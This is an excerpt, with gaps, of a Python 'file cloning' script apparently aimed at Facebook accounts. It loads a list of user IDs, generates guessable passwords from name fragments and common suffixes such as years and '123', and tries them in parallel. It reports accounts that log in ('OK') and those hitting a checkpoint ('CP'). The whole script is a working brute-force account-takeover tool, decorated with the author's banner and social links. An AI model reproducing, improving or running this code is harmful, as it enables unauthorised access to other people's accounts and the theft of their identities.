...
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mFULL UPDATE TOOLS DATE:-2023-09-18 ')

time.sleep(3)

os.system('clear')

print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92m Follow My Facebook account")

time.sleep(1)

os.system(f'xdg-open https://www.facebook.com/shoaibahamed421')
...
logo ="""
 \033[31;1m┏┓┓┏┏┓┏┓┳┳┓  ┏┓┓┏┏┓┳┳┓┏┓┳┓
 \033[32;1m┗┓┣┫┃┃┣┫┃┣┫  ┣┫┣┫┣┫┃┃┃┣ ┃┃
 \033[33;1m┗┛┛┗┗┛┛┗┻┻┛  ┛┗┛┗┛┗┛ ┗┗┛┻┛ \33[1;96mᥕᥱᥣᥴomᥱ to nᥱᥕ bᥲnnᥱr
\x1b[38;5;46m═════════════════════════════════════════════════×SH
\033[1;31m[\033[1;32m[S]\033[1;31m]\033[1;32m [≠] Github    ➤ SHOAIB-404
\033[1;31m[\033[1;32m[H]\033[1;31m]\033[1;32m [≠] Author    ➤ [SHOAIB AHAMED]
\033[1;31m[\033[1;32m[O]\033[1;31m]\033[1;32m [≠] Facebook  ➤ shoaibahamed421
\033[1;31m[\033[1;32m[A]\033[1;31m]\033[1;32m [≠] TOOLS     ➤ FILE CLONE
\033[1;31m[\033[1;32m[I]\033[1;31m]\033[1;32m [≠] VERSION   ➤ \033[1;96mPRO//0.5
\033[1;31m[\033[1;32m[B]\033[1;31m]\033[1;32m [≠] WARNING.  ➤\33[1;31m Don’t Eat Gaza🚬 ✘
\x1b[38;5;46m═════════════════════════════════════════════════×SH"""
os.system('clear')
...
def FILE():
			...
			try:
				print('\033[0;97m===================')
				print('\033[1;33m[+]IMPORT FILE NAME:- \033[1;32mETC......./sdcard/5.txt')
				print('\033[0;97m===================')
				FILEX = input ('\033[1;32mFILE NAME :- ');os.system('clear');print(logo)
				for line in open(FILEX, 'r').readlines():
					id.append(line.strip())
				setting()
			except IOError:
				exit(" \033[1;42 FILE Not Found ?[!]"%(FILEX))
def setting():
	os.system('clear')
	print(logo)
...
def passwrd():
	os.system('clear')
	print(logo)
	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mSHOAIB AHAMED CYBER WOLD')
	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mALL COUNTRY WORKING')
	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mFILE CLONING START')
	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mYOUR TOTAL IDz \033[0;97m:\033[1;92m "+str(len(id)))
	print("\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mUse Flight Mode For Speed Up ")
	print('\033[0;97m===============================================')
		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				...
				if len(frs)<3:
					...
					pwv.append(frs+'2024')
					pwv.append(frs+'2022')
					pwv.append(frs+'ahmad')
					pwv.append(frs+'2001')
					pwv.append(frs+'2000')
					pwv.append(frs+'2002')
					pwv.append('nusrat'+frs)
					pwv.append(frs+'love')
					pwv.append('sadia12')
					pwv.append('mim123')
			if 'ya' in pwpluss:
			...
			if 'mobile' in method:
				...
				pool.submit(crackfree,idf,pwv)
	print('')
	print(' \033[1;39m OK = %s '%(ok))
	print('')
	print(' \033[1;32m CP = %s '%(cp))
	print('')
	exit()
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([u,u,u])
	sys.stdout.write(f"\r \033[1;35m[\033[1;96mSHOAIB]   {P}{H}{loop} \033[1;35m{P}{P}{H}=\033[1;35m {ok}\033[1;35m{P} \033[1;35m "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\033[1;31m [SHOAIB-2F]\033[1;31m  {idf}\033[1;31m |\033[1;31m {pw}')
				...
				print(f'\r\033[1;29m [SHOAIB-OK]\033[1;29m  {idf} \033[1;29m| \033[1;29m{pw}')
